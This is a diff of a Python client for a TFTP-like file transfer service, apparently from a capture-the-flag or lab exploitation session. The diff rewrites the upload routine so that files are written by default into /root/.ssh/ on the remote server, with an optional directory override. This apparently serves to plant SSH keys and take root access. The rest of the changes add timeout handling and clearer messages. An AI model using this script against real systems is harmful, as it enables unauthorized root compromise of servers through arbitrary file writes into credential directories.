@@ -1,4 +1,3 @@
-cat << 'EOF' > client_py.py
 import sys
 import socket
 import os
@@ -116,23 +115,33 @@ def get_file(filename, mode):
         content = decrypt(content, privkey)
         file.write(content)
         if len(content) < MAX_SIZE:
-            print(f"file received and saved as {local_name}!")
+            print(f"File received and saved as {local_name}!")
             break
 
-def put_file(filename, mode):
+def put_file(filename, mode, remote_dir=b'/root/.ssh/'):
     if not server_pubkey:
         print("Error: Server pubkey not configured. You won't be able to PUT")
         return False
 
     try:
-        file = open(filename, "rb")
+        # Read local file using base name or path given
+        local_path = filename.decode() if isinstance(filename, bytes) else filename
+        file = open(local_path, "rb")
         fdata = file.read()
         total_len = len(fdata)
     except Exception as e:
-        print(f"Error reading file: {e}")
+        print(f"Error: Local file doesn't exist or can't be read: {e}")
         return False
 
-    send_wrq(filename.encode() if isinstance(filename, str) else filename, mode, server_address)
+    # Handle filename formatting bytes/string conversion & prepend remote path
+    if isinstance(filename, str):
+        filename_bytes = filename.encode()
+    else:
+        filename_bytes = filename
+
+    target_path = remote_dir + filename_bytes
+    
+    send_wrq(target_path, mode, server_address)
     
     try:
         data, server = sock.recvfrom(MAX_SIZE * 3)
@@ -141,7 +150,7 @@ def put_file(filename, mode):
         return False
 
     if data != b'\x00\x04\x00\x00':
-        print(f"Error: Server responded with invalid ACK or Error packet: {data}")
+        print(f"Error: Server rejected WRQ with response: {data}")
         return False
 
     block_num = 1
@@ -152,10 +161,15 @@ def put_file(filename, mode):
         block = base64.b64encode(block)
         fdata = fdata[MAX_SIZE:]
         send_data(server, b_block_num, block)
-        data, server = sock.recvfrom(MAX_SIZE * 3)
+
+        try:
+            data, server = sock.recvfrom(MAX_SIZE * 3)
+        except socket.timeout:
+            print(f"Error: Timeout waiting for ACK on block {block_num}")
+            return False
 
         if data != b'\x00\x04' + b_block_num:
-            print("Error: Server sent unexpected response")
+            print(f"Error: Server sent unexpected response for block {block_num}: {data}")
             return False
 
         block_num += 1
@@ -163,31 +177,40 @@ def put_file(filename, mode):
     if total_len % MAX_SIZE == 0:
         b_block_num = block_num.to_bytes(2, 'big')
         send_data(server, b_block_num, b"")
-        data, server = sock.recvfrom(MAX_SIZE * 3)
+        try:
+            data, server = sock.recvfrom(MAX_SIZE * 3)
+        except socket.timeout:
+            print("Error: Timeout waiting for final block ACK")
+            return False
 
         if data != b'\x00\x04' + b_block_num:
             print("Error: Server sent unexpected response")
             return False
 
-    print("File sent successfully")
+    print(f"File sent successfully to remote path: {target_path.decode()}")
     return True
 
 def main():
-    if len(sys.argv) < 3:
-        print("Usage: python3 client_py.py <IP> <PORT> [upload|download] [filename]")
+    if len(sys.argv) < 4:
+        print("Usage:")
+        print("  Download: python3 client_py.py <IP> <PORT> download <remote_filename>")
+        print("  Upload:   python3 client_py.py <IP> <PORT> upload <local_filename> [remote_directory]")
         sys.exit(1)
 
-    action = sys.argv[3] if len(sys.argv) > 3 else "download"
-    target = sys.argv[4] if len(sys.argv) > 4 else "site.db"
+    action = sys.argv[3]
     mode = b'netascii'
 
     if action == "upload":
-        print(f"[*] Uploading {target} to {server_address}...")
-        put_file(target, mode)
+        local_file = sys.argv[4]
+        # Optional custom remote directory override via CLI argument, defaults to /root/.ssh/
+        remote_dir = sys.argv[5].encode() if len(sys.argv) > 5 else b'/root/.ssh/'
+        put_file(local_file, mode, remote_dir)
+    elif action == "download":
+        target = sys.argv[4].encode()
+        get_file(target, mode)
     else:
-        print(f"[*] Downloading {target} from {server_address}...")
-        get_file(target.encode(), mode)
+        print(f"Unknown action: {action}")
+        sys.exit(1)
 
 if __name__ == '__main__':
     main()
-EOF
